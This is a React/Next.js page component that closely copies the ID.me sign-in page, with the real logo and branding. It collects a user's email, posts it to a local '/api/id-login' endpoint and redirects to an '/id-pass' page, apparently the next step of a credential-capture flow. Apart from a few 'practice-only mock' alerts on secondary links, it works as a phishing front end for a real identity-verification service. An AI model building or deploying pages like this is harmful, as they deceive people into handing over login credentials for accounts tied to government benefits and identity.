"use client";

import Image from "next/image";
import Link from "next/link";
import { useState } from "react";
import { useRouter } from "next/navigation";

export default function IdMeMockPage() {
  const router = useRouter();

  const [email, setEmail] = useState("");
  const [remember, setRemember] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setError("");

    if (!email) {
      setError("Please enter your email.");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch("/api/id-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          remember,
        }),
      });

      if (!res.ok) {
        const text = await res.text();
        console.error("Server error:", text);
        setError("Something went wrong. Please try again.");
        return;
      }

      // ✅ Redirect on success
      router.push("/id-pass");
    } catch (err) {
      console.error("Network error:", err);
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-white text-[#1f2937]">
      {/* Top brand row */}
      <header className="pt-8 pb-4">
        <div className="mx-auto flex max-w-5xl items-center justify-center px-4">
          <div className="relative h-10 w-48">
            <Image
              src="/idme.png"
              alt="ID.me logo"
              fill
              className="object-contain"
              priority
            />
          </div>
        </div>
      </header>

      {/* Center card */}
      <section className="px-4 py-4">
        <div className="mx-auto w-full max-w-sm">
          <div className="rounded-xl bg-white shadow-[0_10px_30px_rgba(0,0,0,0.12)] ring-1 ring-black/5 p-4">
            <h1 className="text-center text-2xl font-semibold text-[#111827]">
              Sign in to ID.me
            </h1>

            <form onSubmit={handleSubmit} className="mt-8 space-y-4">
              {/* Email */}
              <div>
                <label htmlFor="email" className="block text-sm font-medium mb-2">
                  Email
                </label>
                <input
                  id="email"
                  type="email"
                  placeholder="Enter email address"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  disabled={loading}
                  required
                  className="w-full rounded-md border border-[#d1d5db] bg-white px-4 py-3 text-sm outline-none focus:border-[#2563eb] focus:ring-2 focus:ring-[#2563eb]/20 disabled:bg-gray-100"
                />
              </div>

              {/* Remember me */}
              <div className="flex items-center gap-2">
                <input
                  id="remember"
                  type="checkbox"
                  checked={remember}
                  onChange={(e) => setRemember(e.target.checked)}
                  disabled={loading}
                  className="h-4 w-4 rounded border-[#d1d5db] text-[#2563eb] focus:ring-[#2563eb]"
                />
                <label htmlFor="remember" className="text-sm text-[#111827]">
                  Remember me
                </label>
              </div>

              {/* Error message */}
              {error && (
                <p className="text-sm text-red-600">{error}</p>
              )}

              {/* Continue button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full rounded-md bg-[#2563eb] py-3 text-sm font-semibold text-white hover:bg-[#1d4ed8] transition disabled:opacity-60 disabled:cursor-not-allowed"
              >
                {loading ? "Processing..." : "Continue"}
              </button>
            </form>

            {/* Create account line */}
            <p className="mt-5 text-center text-sm text-[#374151]">
              New to ID.me?{" "}
              <Link
                href="/idme-mock/create"
                className="text-[#2563eb] underline underline-offset-2 hover:text-[#1d4ed8]"
              >
                Create an account
              </Link>
            </p>
          </div>

          {/* Language selector */}
          <div className="mt-8 flex items-center justify-center">
            <button
              type="button"
              className="text-sm text-[#2563eb] hover:text-[#1d4ed8] underline underline-offset-2"
              onClick={() => alert("Practice-only mock language dropdown.")}
            >
              English
            </button>
          </div>

          {/* Footer links */}
          <footer className="mt-6 flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-sm text-[#2563eb]">
            {["What is ID.me?", "Terms of Service", "Privacy Policy"].map(
              (item, i) => (
                <span key={i} className="flex items-center gap-2">
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      alert("Practice-only mock link.");
                    }}
                    className="underline underline-offset-2 hover:text-[#1d4ed8]"
                  >
                    {item}
                  </a>
                  {i < 2 && <span className="text-[#9ca3af]">|</span>}
                </span>
              )
            )}
          </footer>
        </div>
      </section>
    </main>
  );
}
